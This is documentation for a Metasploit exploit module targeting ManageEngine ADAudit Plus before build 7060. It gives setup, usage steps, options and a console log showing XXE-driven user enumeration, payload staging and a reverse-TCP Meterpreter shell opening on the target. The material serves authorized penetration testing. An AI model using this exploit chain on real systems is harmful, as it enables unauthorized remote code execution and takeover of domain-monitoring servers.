## Vulnerable Application

The vulnerable application is ManageEngine ADAudit Plus prior to build 7060. I built and tested this on build 7055, which, at least at the time of this writing, you can download [here](https://archives2.manageengine.com/active-directory-audit/). It's a .exe file that you can install with all the defaults.

You also need to configure ADAudit to actually audit a domain. That means setting up a domain (I created a domain controller in the lab), and configuring ADAudit to scan that domain. That domain name must be set to the `DOMAIN` when using this exploit.

The last thing is, three connect-back ports must be open from the target back to Metasploit (in addition to whatever payload ports). By default, we use ports 8080 and 8888 for HTTP, and 2121 for FTP.

## Verification Steps

1. Install the application
2. Do: `set RHOSTS <IP>`
3. Do: `set DOMAIN <DOMAIN_NAME>`
4. Do: `exploit`
5. You should get a meterpreter session

## Scenarios

```
msf6 > use exploit/windows/http/manageengine_adaudit_plus_cve_2022_28219
[*] No payload configured, defaulting to cmd/windows/powershell/meterpreter/reverse_tcp
msf6 exploit(windows/http/manageengine_adaudit_plus_cve_2022_28219) > set RHOSTS 10.0.0.148
RHOSTS => 10.0.0.148
msf6 exploit(windows/http/manageengine_adaudit_plus_cve_2022_28219) > set DOMAIN ad.example.local
DOMAIN => ad.example.local
msf6 exploit(windows/http/manageengine_adaudit_plus_cve_2022_28219) > exploit

[*] Started reverse TCP handler on 10.0.0.146:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. The vulnerable endpoint responds with HTTP/200.
[*] Attempting to exploit XXE to get a list of users
[*] Using URL: http://10.0.0.146:8080/KEmvnPFxS.dtd
[*] User accounts discovered: Ron
[*] Enumerating old payloads cached on the server (to skip later)
[*] Using URL: http://10.0.0.146:8080/NvkXTJXRyhV.dtd
[*] Attempting to exploit XXE to store our serialized payload on the server
[*] Trying to find our payload in all users' temp folders
[*] Using URL: http://10.0.0.146:8080/ppVHiihu.dtd
[*] Executing payload: /users/Ron/appdata/local/temp/jar_cache4413164256015023251.tmp...
[*] Sending stage (175686 bytes) to 10.0.0.148
[*] Meterpreter session 1 opened (10.0.0.146:4444 -> 10.0.0.148:52347) at 2022-07-07 15:19:59 -0700

meterpreter >
```

## Options

### TARGETURI_DESERIALIZATION / TARGETURI_XXE

The target URLs - probably won't ever need to be changed

### DOMAIN

A domain that the target monitors. We cannot validate this, but if the exploit should work and doesn't, this might be the issue.

### SRVPORT / SRVPORT_FTP / SRVPORT_HTTP2

The connect-back ports.

* `SRVPORT` is used to host XXE payloads
* `SRVPORT_HTTP2` is used for an XXE payload that is held open, creating a temporary file on the server
* `SRVPORT_FTP` is used for a fake off-spec FTP server that receives a directory listing also via XXE

# PATH_TRAVERSAL_DEPTH

The number of `../` to add to the request

# FtpCallbackTimeout / HttpUploadTimeout

How long to wait for FTP or HTTP responses before giving up
